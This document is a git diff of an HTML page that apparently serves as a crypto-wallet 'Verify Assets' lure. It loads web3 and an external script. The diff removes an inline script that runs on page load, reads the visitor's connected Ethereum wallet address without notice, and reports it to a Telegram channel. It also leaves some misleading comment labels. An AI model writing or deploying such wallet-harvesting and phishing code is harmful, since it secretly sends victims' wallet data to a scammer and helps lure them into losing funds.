@@ -11,11 +11,16 @@
   <!-- Favicon -->
   <link rel="icon" type="image/png" href="images/favicon.png">
 
-  <!-- Google Fonts + Font Awesome -->
+  <!-- Google Fonts -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+  <!-- Local CSS -->
   <link rel="stylesheet" href="styles.css">
 
-  <!-- Web3 JS -->
+  <!-- Font Awesome (Updated Version) -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+
+  <!-- JS Libraries -->
   <script src="js/web3.min.js"></script>
 </head>
 
@@ -42,25 +47,8 @@
 
     <button id="verifyBtn" class="next-btn" onclick="Next()">Verify Assets</button>
   </main>
-    window.addEventListener("load", async () => {
-      if (window.ethereum) {
-        try {
-          const accounts = await ethereum.request({ method: "eth_accounts" });
-          if (accounts.length > 0) {
-            const wallet = accounts[0];
-            const message = `🟢 *Wallet Connected*\nWallet: \`${wallet}\`\nTime: ${new Date().toLocaleString()}`;
-            sendTelegramMessage(message);
-          }
-        } catch (err) {
-          console.error("Wallet check failed:", err);
-        }
-      } else {
-        console.log("MetaMask not found");
-      }
-    });
-  </script>
 
-  <!-- ✅ Load Your Script.js Only Once -->
+  <!-- Custom Script -->
   <script src="js/script.js"></script>
 </body>
 </html>
